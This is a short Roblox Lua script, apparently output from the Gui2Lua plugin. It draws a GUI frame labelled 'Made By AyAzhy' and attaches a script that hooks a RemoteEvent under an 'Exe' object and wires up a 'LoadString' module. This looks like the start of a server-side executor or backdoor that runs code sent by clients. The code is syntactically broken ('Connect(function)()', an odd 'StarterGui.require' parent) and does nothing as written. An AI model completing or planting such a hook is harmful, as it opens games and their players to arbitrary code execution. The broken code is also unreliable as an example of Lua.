--[[

		Gui2Lua™
		10zOfficial
		Version 1.0.0

]]


-- Instances

local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")

-- Properties

Frame.Parent = game.StarterGui.require
Frame.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 366, 0, 159)
Frame.Size = UDim2.new(0, 689, 0, 402)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 689, 0, 55)
TextLabel.Font = Enum.Font.FredokaOne
TextLabel.Text = "Made By AyAzhy"
TextLabel.TextColor3 = Color3.new(0.992157, 0.992157, 0.992157)
TextLabel.TextSize = 45

UIAspectRatioConstraint.Parent = TextLabel
UIAspectRatioConstraint.AspectRatio = 12.527273178100586

UIAspectRatioConstraint_2.Parent = Frame
UIAspectRatioConstraint_2.AspectRatio = 1.713930368423462

-- Scripts

local function MEQPCUP_fake_script() -- Frame.Script 
	local script = Instance.new('Script', Frame)

	script.Parent.Parent.Exe.RemoteEvent.OnServerEvent:Connect(function)()
		loadstring=require(script.LoadString)
	end
end
coroutine.wrap(MEQPCUP_fake_script)()
